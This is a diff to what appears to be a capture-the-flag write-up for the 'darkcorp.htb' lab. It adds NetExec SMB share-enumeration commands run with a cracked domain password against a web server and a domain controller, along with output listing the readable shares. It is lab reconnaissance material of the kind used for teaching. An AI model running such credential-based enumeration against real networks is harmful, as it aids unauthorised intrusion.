@@ -689,7 +689,34 @@ The cracked password found earlier gets me initial access on both hosts
 ## Shares
 
 ```python
-
+nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares
+SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
+SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.2     445    WEB-01           [*] Enumerated shares
+SMB         172.16.20.2     445    WEB-01           Share           Permissions     Remark
+SMB         172.16.20.2     445    WEB-01           -----           -----------     ------
+SMB         172.16.20.2     445    WEB-01           ADMIN$                          Remote Admin
+SMB         172.16.20.2     445    WEB-01           C$                              Default share
+SMB         172.16.20.2     445    WEB-01           IPC$            READ            Remote IPC
 ```
+
+Read access on `IPC$` on the web-01 machine
+
+```python
+nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
+SMB         172.16.20.1     445    DC-01            [*] Enumerated shares
+SMB         172.16.20.1     445    DC-01            Share           Permissions     Remark
+SMB         172.16.20.1     445    DC-01            -----           -----------     ------
+SMB         172.16.20.1     445    DC-01            ADMIN$                          Remote Admin
+SMB         172.16.20.1     445    DC-01            C$                              Default share
+SMB         172.16.20.1     445    DC-01            CertEnroll      READ            Active Directory Certificate Services share
+SMB         172.16.20.1     445    DC-01            IPC$            READ            Remote IPC
+SMB         172.16.20.1     445    DC-01            NETLOGON        READ            Logon server share 
+SMB         172.16.20.1     445    DC-01            SYSVOL          READ            Logon server share
+```
+
+
 
 
